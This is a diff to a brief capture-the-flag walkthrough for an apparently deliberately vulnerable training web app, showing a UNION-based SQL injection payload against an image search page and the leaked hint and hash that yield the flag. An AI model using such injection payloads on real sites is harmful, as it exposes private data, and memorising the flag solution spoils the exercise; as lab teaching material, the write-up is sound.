@@ -1,9 +1,9 @@
 [ Walkthrough ]
 
-Go to : http://192.168.99.100/?page=searchimg
+Go to : http://[IP]/?page=searchimg
 Using the same method as the Members SQL Injection, we know there is a table called 'list_images' with column names id, url, title, comment.
 
-We can play around, but it gets interesting when using : 1=1  union select comment, title from list_images
+We can play around, but it gets interesting when using : 1=1  union select comment, title from list_images;
 We can see :
 [Title] Title: Hack me ?
 [Comment] Url : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
